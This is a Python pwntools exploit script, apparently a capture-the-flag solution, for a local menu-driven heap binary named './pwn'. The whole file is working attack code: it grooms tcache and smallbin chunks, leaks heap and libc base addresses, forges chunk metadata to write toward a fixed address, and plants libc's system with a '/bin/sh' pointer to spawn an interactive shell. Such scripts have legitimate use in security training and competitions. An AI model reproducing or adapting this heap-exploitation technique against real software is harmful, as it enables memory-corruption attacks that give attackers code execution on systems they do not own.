from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr32 = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b"choice: "
def add(idx, size):
	sla(menu, b'1')
	sla(b'idx: ', byte(idx))
	sla(b'size: ', byte(size))

def dele(idx):
	sla(menu, b'2')
	sla(b'idx: ', byte(idx))

def show(idx):
	sla(menu, b'3')
	sla(b'idx: ', byte(idx))	

def edit(idx, content):
	sla(menu, b'4')
	sla(b'idx: ', byte(idx))
	sda(b'content: ', content)

def print_mes():
	sla(menu, b'5')

def mal_mes(content):
	sla(menu, b'6')
	sda(b'message: ', content)

def execve():
	sla(menu, b'7')

payload = p64(0x23333000+0x20)*6
sda(b'name: ', payload)
sla(b'message: ', b'1')

for i in range(5):
	add(0, 0x88)
	dele(0)

for i in range(7):
	add(0, 0x188)
	dele(0)

# 构造0x90的smallbin
for i in range(2):
	add(0, 0x188)
	add(1, 0x200)
	dele(0)
	add(0, 0xF8)
	dele(0)
	add(0, 0x100)
	dele(0)
	dele(1)

add(0, 23333)
show(0)
heap_base = addr64(b'1.add') - 0x1060
print("heap_base : ", hex(heap_base))
payload = b'\x00'*0xF0 + p64(0) + p64(0x91) + p64(heap_base+0x1150) + p64(0x23333000-0x10) 
edit(0, payload)
add(1, 0x88)
print_mes()
rut(b'message: ')
libc.address = addr64(b'\n') - 0x1eac60
print("libc_base : ", hex(libc.address))
payload = p64(libc.symbols['system']) + p64(next(libc.search(b'/bin/sh')))*6 + p64(0)*2
mal_mes(payload)
execve()

#debug()
sh()
